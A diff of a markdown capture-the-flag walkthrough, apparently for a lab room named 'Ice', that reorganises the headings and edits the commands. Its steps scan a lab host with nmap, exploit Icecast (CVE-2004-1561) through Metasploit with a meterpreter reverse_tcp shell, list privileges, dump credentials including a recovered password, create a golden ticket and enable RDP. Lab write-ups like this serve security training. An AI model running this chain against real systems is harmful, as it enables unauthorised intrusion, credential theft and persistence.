@@ -1,19 +1,24 @@
 ---
-title: Ice
+title: 'Ice'
 ---
 
+- [Tools & Commands](#tools-&-commands)
+- [Task 2 - Recon](#task-2---recon)
+- [Task 3 - Access](#task-3---access)
+- [Task 4 - Escalate](#task-4---escalate)
+- [Task 5 - Looting](#task-5---looting)
+- [Task 6 - Post Exploitation](#task-6---post-exploitation)
 	- [met](#met)
 	- [msf](#msf)
+- [Task 7 - Further Credit](#task-7---further-credit)
 
-# Tools & Commands
+## Tools & Commands
 
 - nmap
 - msfconsole: search, use, set, run
 - meterpreter: sysinfo, bg, ps, migrate, load, man
 
-# Task 1 - Set up VM
-
-# Task 2 - Recon
+## Task 2 - Recon
 
 ```bash
 $ sudo nmap -sS -p- 10.10.104.197 # syn scan, all ports
@@ -21,7 +26,7 @@ $ nmap -sV -p8000 10.10.104.197 # icecast
 $ nmap -sC 10.10.104.197 # script scan, find host name
 ```
 
-# Task 3 - Access
+## Task 3 - Access
 
 [CVE security vulnerability database. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/google-search-results.php?q=icecast)
 
@@ -33,24 +38,15 @@ CVE-2004-1561
 $ msfconsole
 msf5 > search icecast
 exploit/windows/http/icecast_header
-msf5 > use 0
+msf5 > use exploit/windows/http/icecast_header
 msf5 > options
 msf5 > set RHOSTS 10.10.104.197
 msf5 > set LHOST 10.4.5.126 # tun0 from ifconfig
 msf5 > set payload windows/meterpreter/reverse_tcp # as reverse_https is buggy
 msf5 > run
-[*] Started HTTPS reverse handler on https://192.168.187.128:8443
-[*] Exploit completed, but no session was created.
-# update metasploit
-$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
-  chmod 755 msfinstall && \
-  ./msfinstall
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
-  chmod 755 msfinstall && \
-  ./msfinstall
 ```
 
-# Task 4 - Escalate
+## Task 4 - Escalate
 
 ```bash
 met > ps
@@ -112,7 +108,7 @@ SeTimeZonePrivilege
 SeUndockPrivilege
 ```
 
-# Task 5 - Looting
+## Task 5 - Looting
 
 ```bash
 met > ps
@@ -128,7 +124,7 @@ met > creds_all
 [..] Password01! [..]
 ```
 
-# Task 6 - Post Exploitation
+## Task 6 - Post Exploitation
 
 ### met
 
@@ -142,6 +138,6 @@ golden_ticket_create # easy authentification
 
 run post/windows/manage/enable_rdp # use password from above
 
-# Task 7 - Further Credit
+## Task 7 - Further Credit
 
 [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/568)
